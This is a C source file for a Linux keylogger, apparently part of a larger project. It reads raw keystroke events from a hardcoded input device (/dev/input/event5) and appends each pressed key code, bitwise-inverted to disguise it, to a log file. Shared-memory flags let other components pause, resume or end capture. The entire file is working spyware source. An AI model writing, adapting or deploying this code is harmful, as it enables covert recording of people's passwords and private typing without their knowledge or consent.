#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>

#include "keylogger.h"
#include "../include/types.h"

#define UAM_KEYBOARD "/dev/input/event5"

typedef struct
{
	int keylogger_finish;
	int keylogger_capture;
} sharedMemoryKeylogger;

/**
 * keylogger_allow puts the flag capture to 1. Only works if keylogger has been initialized
 */
void keylogger_allow()
{
	/*open the shared memory*/
	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);

	if (fd_shm == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_allow] Error opening the shared memory segment\n");
#endif

		return;
	}

	/* Map the memory segment */
	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);

	if (aux == MAP_FAILED)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n");
#endif
		return;
	}
	if (aux->keylogger_capture == 0)
		aux->keylogger_capture = 1;

	munmap(aux, sizeof(*aux));

	return;
}

/**
 * keylogger_deny puts the flag capture to 0. Only works if keylogger has been initialized
 */
void keylogger_deny()
{
	/*open the shared memory*/
	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);

	if (fd_shm == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_deny] Error opening the shared memory segment\n");
#endif

		return;
	}

	/* Map the memory segment */
	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);

	if (aux == MAP_FAILED)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n");
#endif
		return;
	}
	if (aux->keylogger_capture == 1)
		aux->keylogger_capture = 0;

	munmap(aux, sizeof(*aux));

	return;
}

/**
 * end the keylogging proccess. Only works if the keylogger has been initialized.
 */
void keylogger_end()
{
	/*open the shared memory*/
	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR, S_IWUSR);

	if (fd_shm == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_end] Error opening the shared memory segment\n");
#endif

		return;
	}

	/* Map the memory segment */
	sharedMemoryKeylogger *aux = mmap(NULL, sizeof(*aux), PROT_WRITE, MAP_SHARED, fd_shm, 0);

	if (aux == MAP_FAILED)
	{
#ifdef DEBUG
		printf(P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n");
#endif
		return;
	}
	aux->keylogger_finish = 1;

	munmap(aux, sizeof(*aux));

	return;
}

int keylogger_init()
{
	size_t rb;
	struct input_event ev[64];
	int i;
	int keybrdToCapture;
	char path[] = UAM_KEYBOARD;
	FILE *file;

	/*___________________________________________________________*/
	/*_______initialize the shared memory with some flags________*/
	/*___________________________________________________________*/

	/*Create the shared memory. It's created in keylogger_init, so if we try to
	change the flags with other function it won't work because the flags doesn't exist*/
	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
	if (fd_shm == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [KEYLOGGER] Error creating the shared memory\n");
#endif
		return ERROR;
	}

	/*resizing shared memory*/
	int error = ftruncate(fd_shm, sizeof(sharedMemoryKeylogger));

	if (error == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n");
#endif
		shm_unlink(SHM_KEYLOGGER);
		return ERROR;
	}
	/* mapping shared memory */
	sharedMemoryKeylogger *shared_memory = mmap(NULL, sizeof(*shared_memory),
												PROT_READ | PROT_WRITE, MAP_SHARED, fd_shm, 0);
	if (shared_memory == MAP_FAILED)
	{
#ifdef DEBUG
		printf(P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n");
#endif
		shm_unlink(SHM_KEYLOGGER);
		return ERROR;
	}

	/*Now the shared memory has been created, so we initialize it*/
	shared_memory->keylogger_capture = 1;
	shared_memory->keylogger_finish = 0;

	/*___________________________________________________________*/
	/*__________________configure the keylogger__________________*/
	/*___________________________________________________________*/

	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
	{
#ifdef DEBUG
		printf(P_ERROR " [KEYLOGGER] Error opening device\n");
#endif
		munmap(shared_memory, sizeof(*shared_memory));
		shm_unlink(SHM_KEYLOGGER);
		return ERROR;
	}
	/*If the keylogger hasn't finished the loop will continue working*/
	while (shared_memory->keylogger_finish == 0)
	{
		/*only capture if it's allowed.
		Interblock is avoid using a conditional sentence.
		If keylogger_capture is not allowed then the loop repeats itself but nothing happens.*/
		if (shared_memory->keylogger_capture == 1)
		{
			rb = read(keybrdToCapture, ev, sizeof(struct input_event) * 64);

			for (i = 0; i < (int)(rb / sizeof(struct input_event)); i++)
			{
				file = fopen(BL, "ab+");
				if (!file)
				{
#ifdef DEBUG
					printf(P_ERROR " [KEYLOGGER] No file?\n");
#endif
					munmap(shared_memory, sizeof(*shared_memory));
					shm_unlink(SHM_KEYLOGGER);
					return ERROR;
				}

				if (EV_KEY == ev[i].type && ev[i].value == 1)
				{
					fputc(~ev[i].code, file);
				}

				fclose(file);
			}
		}
	}

	/*free shared memory*/
	munmap(shared_memory, sizeof(*shared_memory));
	shm_unlink(SHM_KEYLOGGER);

	return OK;
}
